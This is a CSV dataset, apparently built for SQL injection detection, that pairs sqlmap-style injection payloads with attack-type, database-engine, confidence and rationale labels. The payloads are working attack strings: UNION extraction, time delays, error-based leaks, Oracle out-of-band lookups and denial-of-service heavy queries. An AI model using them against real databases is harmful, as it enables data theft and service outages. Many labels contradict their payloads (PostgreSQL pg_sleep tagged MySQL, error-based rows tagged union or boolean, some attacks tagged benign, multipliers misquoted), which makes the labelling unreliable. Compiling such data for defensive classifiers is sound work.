id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
37,"1%"" ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( ""%"" = """,error_based,mssql,0.9,"Type conversion error (e.g., 'convert(int, ...)') used to leak data in error-based SQLi.",1
38,-7497' ) as kjzt where 3758 = 3758 or 4794 = 9499--,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
39,1' ) ) ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ( ( 'mzqi' = 'mzqi,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
40,"-9247' ) ) ) union all select 6964,6964,6964,6964,6964,6964,6964,6964,6964--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
41,"1' and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x ) and 'eovg' like 'eovg",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",1
42,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 7749 = 7749",time_blind,sqlite,0.9,"'randomblob(N)' with a large N creates a processing delay in SQLite, used for time-based blind SQLi.",2
43,"1' ) ) ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ( 'nlky' like 'nlky",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
44,"-9904"" ) ) union all select 9080,9080,9080,9080,9080--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
45,-4410 where 5749 = 5749 or 1317 = 9823--,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
46,"1 ) ) or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
47,"1 and row ( 6237,7469 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 6237 = 6237,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 5192 union select 3785 union select 3931 union select 7158 ) a group by x )",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",1
48,"1' in boolean mode ) union all select null,null,null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
49,-9389' ) order by 1#,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",3
50,1' ) ) and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'mmfq' = 'mmfq,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
51,-2749' ) as fiho where 3531 = 3531 or 2777 = 1485#,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
52,"1"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""egxe"" = ""egxe",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
53,-6453%' ) ) or ( 8459 = 8459 ) *4906 and ( ( '%' = ',boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,2
54,"1"" and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ""buzb"" = ""buzb",error_based,oracle,0.9,'utl_inaddr.get_host_address' used in Oracle for error-based or out-of-band data exfiltration.,3
55,"1"" ) ) ) rlike ( select ( case when ( 7975 = 2446 ) then 1 else 0x28 end ) ) and ( ( ( ""qixm"" like ""qixm",boolean_blind,mysql,0.9,"MySQL specific boolean operator used for boolean-based blind injection: 1"" ) ) ) rlike ( sel...",3
56,-1300 ) as rrsm where 1086 = 1086 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,error_based,oracle,0.9,'utl_inaddr.get_host_address' used in Oracle for error-based or out-of-band data exfiltration.,3
57,1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',boolean_blind,firebird,0.9,Firebird metadata table 'rdb$database' or 'rdb$fields' used in boolean-based blind injection.,3
58,"1"" ) where 3390 = 3390",benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
59,"1' ) as sjmt where 6541 = 6541 or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",heavy_query,postgresql,0.9,"'generate_series' with a large range (5,000,000) creates a massive result set for heavy query DoS.",3
60,"select sleep ( 5 ) and ( ( ( ""lczw"" = ""lczw",time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
61,1' in boolean mode ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) #,error_based,oracle,0.9,'utl_inaddr.get_host_address' used in Oracle for error-based or out-of-band data exfiltration.,3
62,1 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) # ewsz,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,1
63,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and 'fbzo' like 'fbzo,error_based,oracle,0.9,'xmltype()' constructor used with malformed XML to trigger Oracle error-based SQL injection.,2
64,"1' ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
65,"-3270%' or elt ( 9404 = 3498,3498 ) and '%' = '",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: -3270%' or elt ( 940...,2
66,"1"" and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ""ygzq"" like ""ygzq",error_based,mysql,0.9,'updatexml()' used to trigger intentional XPath errors for error-based SQL injection in MySQL.,1
67,"-6534%' ) ) or make_set ( 4107 = 9457,9457 ) and ( ( '%' = '",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: -6534%' ) ) or make_...,2
68,"1 ) as qodq where 4945 = 4945 or 9643 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
69,"1'|| ( select 'uyfo' where 1236 = 1236 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) ) ||'",boolean_blind,oracle,0.9,Oracle metadata table 'all_users' or 'all_tables' access attempted in a boolean context for blind injection.,3
70,"-2241 ) ) ) or make_set ( 9354 = 9354,7185 ) and ( ( ( 6840 = 6840",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: -2241 ) ) ) or make_...,2
71,"1 ) where 8302 = 8302 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,oracle,0.9,'dbms_pipe.receive_message' is an Oracle-specific function often used for time-based blind injection.,3
72,1%' ) ) ),benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",3
73,"1 ) ) as mmby where 3990 = 3990 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,0.9,'dbms_pipe.receive_message' is an Oracle-specific function often used for time-based blind injection.,3
74,"-4586' ) as shdb where 6176 = 6176 union all select 6176,6176,6176,6176#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
75,1'+ ( select lqhd where 4251 = 4251 and ( 8754 = 5779 ) *5779 ) +',boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
76,-2717' ) ) ) or 8571 = 8571--,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
77,"1 ) ) union all select null,null,null,null,null--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
78,"1%"" ) ) ) and make_set ( 8403 = 8403,8899 ) and ( ( ( ""%"" = """,boolean_blind,mysql,0.9,"MySQL specific boolean operator used for boolean-based blind injection: 1%"" ) ) ) and make_s...",2
79,1%' ),benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",3
80,"-5698' ) ) as egjr where 5586 = 5586 union all select 5586,5586,5586--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
81,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
82,1'|| ( select 'sbip' from dual where 7302 = 7302 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) ) ||',time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
83,1'|| ( select 'bwqc' from dual where 6897 = 6897 and sleep ( 5 ) #,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
84,1' ) ) as hzbj where 1725 = 1725 or sleep ( 5 ) #,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
85,"-2979' ) ) as klou where 7092 = 7092 union all select 7092,7092--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
86,"1' ) union all select null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
87,"1 ) where 5336 = 5336 union all select null,null,null,null,null,null,null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
88,"1' ) where 4297 = 4297 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,firebird,0.9,Firebird metadata table 'rdb$database' or 'rdb$fields' used in boolean-based blind injection.,3
89,"1"" or exp ( ~ ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 6270 = 6270,1 ) ) ) ,0x717a767a71,0x78 ) ) x ) ) and ""pnub"" = ""pnub",boolean_blind,mysql,0.9,"MySQL specific boolean operator used for boolean-based blind injection: 1"" or exp ( ~ ( sele...",2
90,"iif ( 2084 = 5671,1,1/0 )",boolean_blind,mssql,0.9,'iif()' with a division by zero ('1/0') used to trigger conditional errors in boolean-blind SQLi.,1
91,"1' ) ) ) or 8315 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( 'raus' = 'raus",boolean_blind,db2,0.9,DB2 metadata table 'sysibm.systables' used for schema discovery in boolean-blind injection.,3
92,1' ) rlike sleep ( 5 ),time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
93,"-8409%' ) or make_set ( 9354 = 9354,7185 ) and ( '%' = '",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: -8409%' ) or make_se...,2
94,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'pqxe' like 'pqxe",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: 1' ) ) or ( select 9...,2
95,"-8812"" ) where 1646 = 1646 union all select 1646,1646,1646,1646,1646,1646--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
96,( select ( case when ( 6035 = 9882 ) then 6035 else 6035* ( select 6035 from mysql.db ) end ) ),benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",1
97,waitfor delay '0:0:5' and ( 'eaxu' = 'eaxu,time_blind,mssql,0.9,"'WAITFOR DELAY' detected, which is the standard method for time-based blind SQLi in MSSQL.",3
98,"1%"" ) ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ( ""%"" = """,heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
99,1' ) ),benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",3
100,"1' and make_set ( 8403 = 8403,8899 ) and 'fttd' like 'fttd",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: 1' and make_set ( 84...,2
101,"-7333%"" ) ) ) or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and ( ( ( ""%"" = """,boolean_blind,firebird,0.9,Firebird metadata table 'rdb$database' or 'rdb$fields' used in boolean-based blind injection.,3
102,1' ) ) rlike ( select ( case when ( 8489 = 8820 ) then 1 else 0x28 end ) ) and ( ( 'fbjf' = 'fbjf,boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: 1' ) ) rlike ( selec...,3
103,"-6505' ) ) as jtnp where 1037 = 1037 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,MySQL specific boolean operator used for boolean-based blind injection: -6505' ) ) as jtnp w...,3
104,"1"" ) union all select null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
105,"1'+ ( select zukr where 9215 = 9215 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) ) +'",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
106,"1%"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,0.9,"'randomblob(N)' with a large N creates a processing delay in SQLite, used for time-based blind SQLi.",2
107,-1087 ) where 5787 = 5787 union all select 5787#,union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
108,1' ) where 4364 = 4364 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
109,"1 where 8390 = 8390 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,0.9,'benchmark()' function detected; used in MySQL to create time delays for blind injection.,2
110,"-1408 ) ) union all select 5715,5715,5715,5715,5715,5715--",union_based,generic,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
111,"select pg_sleep ( 5 ) and ( ( ( ""%"" = """,time_blind,mysql,0.9,'sleep(N)' function call detected; this is a standard MySQL time-based blind injection signal.,2
112,1' ) as tsge where 6970 = 6970,benign,generic,0.7,"No clear SQL injection attack signals (UNION, SLEEP, XML error, etc.) detected in the payload.",2
113,1' ) ) ) and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'kkgt' = 'kkgt,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
114,"1 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) -- huss",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
115,"1 ) ) union all select null,null,null,null,null,null,null#",union_based,mysql,0.9,"'union all select' structure detected, typical for extracting data via UNION-based injection.",3
116,"1%"" ) ) ) and 7758 = 4792 and ( ( ( ""%"" = """,boolean_blind,generic,0.9,Standard boolean logic ('AND'/'OR' with equality) used for boolean-based blind SQL injection.,3
117,"1%"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",heavy_query,generic,0.9,"'regexp_substring' with a very large 'repeat' multiplier (500,000,000) is a DoS-style heavy query attack.",2
